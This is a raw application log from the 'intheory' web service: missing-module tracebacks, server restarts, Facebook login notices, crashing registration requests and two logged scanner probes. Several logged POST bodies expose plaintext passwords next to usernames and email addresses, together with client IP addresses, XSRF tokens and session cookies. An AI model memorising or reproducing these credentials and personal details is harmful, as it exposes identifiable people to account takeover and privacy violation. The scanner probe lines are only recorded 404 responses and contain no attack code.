  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
      File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    import paypal
ImportErrorfrom urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
: No module named paypal    
from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
Traceback (most recent call last):
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app.py", line 12, in <module>
    from urls import url_patterns
  File "/www/virtualenv/intheory/src/urls.py", line 6, in <module>
    from app.handlers import base, user, test, home, admin,  dashboard, learn, landing, practise, payments
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 4, in <module>
    import paypal
ImportError: No module named paypal
Server started successfully.
Server started successfully.
INFO:intheory-8001:Server started successfully.
INFO:intheory-8000:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Server started successfully.
Server started successfully.
INFO:intheory-8000:Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Free voucher transaction
INFO:intheory-8001:User with id 506effd18e4c8564abe4192ahas paid. The transaction id is Free voucher transaction
Error while registering user with username kronosmes: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
WARNING:intheory-8002:Error while registering user with username kronosmes: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Uncaught exception POST /register (127.0.0.1)
HTTPRequest(protocol='http', host='intheory.co.uk', method='POST', uri='/register', version='HTTP/1.0', remote_ip='127.0.0.1', body='username=kronosmes&password=97mitha&email=kronosmes%40hotmail.com&_xsrf=ac0ffd8e3a8c426c99ec18cf53af0a62', headers={'Referer': 'http://intheory.co.uk/register', 'Content-Length': '104', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '86.169.237.161', 'Cookie': '_xsrf=ac0ffd8e3a8c426c99ec18cf53af0a62; __utma=188782963.1096571679.1350503820.1350503820.1350503820.1; __utmb=188782963.1.10.1350503820; __utmc=188782963; __utmz=188782963.1350503820.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 3 arguments (1 given)
ERROR:root:500 POST /register (127.0.0.1) 113.00ms
Error while registering user with username kronosmes: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
WARNING:intheory-8000:Error while registering user with username kronosmes: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Uncaught exception POST /register (127.0.0.1)
HTTPRequest(protocol='http', host='intheory.co.uk', method='POST', uri='/register', version='HTTP/1.0', remote_ip='127.0.0.1', body='username=kronosmes&password=97mitha&email=kronosmes%40hotmail.com&_xsrf=ac0ffd8e3a8c426c99ec18cf53af0a62', headers={'Referer': 'http://intheory.co.uk/register', 'Content-Length': '104', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '86.169.237.161', 'Cookie': '_xsrf=ac0ffd8e3a8c426c99ec18cf53af0a62; __utma=188782963.1096571679.1350503820.1350503820.1350503820.1; __utmb=188782963.1.10.1350503820; __utmc=188782963; __utmz=188782963.1350503820.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 3 arguments (1 given)
ERROR:root:500 POST /register (127.0.0.1) 21.07ms
Error while registering user with username kronosmes: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
WARNING:intheory-8003:Error while registering user with username kronosmes: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "kronosmes@hotmail.com" })
ERROR:root:Uncaught exception POST /register (127.0.0.1)
HTTPRequest(protocol='http', host='intheory.co.uk', method='POST', uri='/register', version='HTTP/1.0', remote_ip='127.0.0.1', body='username=kronosmes&password=97mitha&email=kronosmes%40hotmail.com&_xsrf=ac0ffd8e3a8c426c99ec18cf53af0a62', headers={'Referer': 'http://intheory.co.uk/register', 'Content-Length': '104', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '86.169.237.161', 'Cookie': '_xsrf=ac0ffd8e3a8c426c99ec18cf53af0a62; __utma=188782963.1096571679.1350503820.1350503820.1350503820.1; __utmb=188782963.1.10.1350503820; __utmc=188782963; __utmz=188782963.1350503820.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 3 arguments (1 given)
ERROR:root:500 POST /register (127.0.0.1) 32.35ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Error while registering user with username George: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
WARNING:intheory-8003:Error while registering user with username George: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Uncaught exception POST /register (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/register', version='HTTP/1.0', remote_ip='127.0.0.1', body='username=George&password=GIOimp1903&email=giorgosera%40gmail.com&_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '103', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/register', 'X-Real-Ip': '86.169.237.161', 'Cookie': '_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5; __utma=188782963.489109469.1349903373.1350500710.1350503857.11; __utmb=188782963.10.10.1350503857; __utmc=188782963; __utmz=188782963.1349903373.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 3 arguments (1 given)
ERROR:root:500 POST /register (127.0.0.1) 13.90ms
Error while registering user with username George: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
WARNING:intheory-8001:Error while registering user with username George: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Uncaught exception POST /register (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/register', version='HTTP/1.0', remote_ip='127.0.0.1', body='username=George&password=GIOimp1903&email=giorgosera%40gmail.com&_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '103', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/register', 'X-Real-Ip': '86.169.237.161', 'Cookie': '_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5; __utma=188782963.489109469.1349903373.1350500710.1350503857.11; __utmb=188782963.10.10.1350503857; __utmc=188782963; __utmz=188782963.1349903373.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 3 arguments (1 given)
ERROR:root:500 POST /register (127.0.0.1) 14.29ms
Server started successfully.
Server started successfully.
INFO:intheory-8000:Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Error while registering user with username George: Cannot resolve field "email"
WARNING:intheory-8003:Error while registering user with username George: Cannot resolve field "email"
ERROR:root:Uncaught exception POST /register (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/register', version='HTTP/1.0', remote_ip='127.0.0.1', body='username=George&password=GIOimp1903&email=giorgosera%40gmail.com&_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '103', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/register', 'X-Real-Ip': '86.169.237.161', 'Cookie': '_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5; __utma=188782963.489109469.1349903373.1350500710.1350503857.11; __utmb=188782963.11.10.1350503857; __utmc=188782963; __utmz=188782963.1349903373.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 3 arguments (1 given)
ERROR:root:500 POST /register (127.0.0.1) 17.42ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Server started successfully.
INFO:intheory-8000:Server started successfully.
Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8001:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
Server started successfully.
Server started successfully.
INFO:intheory-8001:Server started successfully.
INFO:intheory-8000:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Server started successfully.
Server started successfully.
INFO:intheory-8001:Server started successfully.
INFO:intheory-8000:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Facebook user with id 5072af228e4c855a1202148c has successfully logged in.
INFO:intheory-8002:Facebook user with id 5072af228e4c855a1202148c has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8000:Facebook user with id None has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
WARNING:root:404 HEAD /manager/status (127.0.0.1) 2.37ms
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (84.241.100.26) 0.74ms
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
